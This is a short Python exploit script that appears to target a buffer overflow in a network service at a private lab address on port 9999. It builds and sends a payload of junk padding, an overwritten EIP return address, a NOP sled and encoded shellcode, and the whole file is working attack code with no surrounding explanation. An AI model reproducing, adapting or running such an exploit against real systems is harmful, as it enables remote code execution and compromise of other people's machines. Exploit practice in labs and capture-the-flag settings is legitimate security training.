import sys
import socket

host = "10.0.2.24"
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    print("Connecting to " + str(host))
    s.connect((host, port))
    s.recv(1024)
    junk = b"A"*524
    EIP = b'\xf3\x12\x17\x31'
    nops = b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
    payload = b'\x89\xe1\xda\xd5\xd9\x71\xf4\x58\x50\x59\x49\x49\x49\x49\x43\
\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34\
\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41\
\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\
\x50\x38\x41\x43\x4a\x4a\x49\x30\x31\x49\x4b\x4b\x47\x4b\x53\
\x56\x33\x57\x33\x31\x43\x32\x4a\x44\x42\x4d\x59\x4b\x51\x48\
\x30\x43\x56\x38\x4d\x4b\x30\x4d\x43\x50\x59\x58\x30\x47\x4f\
\x48\x4d\x4b\x30\x37\x39\x33\x49\x4b\x49\x52\x48\x54\x4a\x35\
\x50\x35\x52\x44\x4a\x43\x58\x43\x32\x35\x50\x43\x34\x38\x52\
\x4d\x59\x4b\x51\x4e\x50\x42\x46\x56\x30\x56\x31\x51\x43\x48\
\x33\x44\x43\x4d\x59\x4b\x51\x48\x4d\x4d\x50\x31\x42\x35\x38\
\x42\x4e\x46\x4f\x52\x53\x52\x48\x32\x48\x36\x4f\x36\x4f\x42\
\x42\x33\x59\x4c\x49\x4a\x43\x51\x42\x51\x43\x4c\x49\x4b\x51\
\x58\x30\x54\x4b\x38\x4d\x4b\x30\x41\x41'

    print("Sending Paylaod...")
    s.sendall(junk+EIP+nops+payload)
    print("Sent")

except Exception as e:
    print("Unable to connect " + str(host) + str(e))
    sys.exit(0)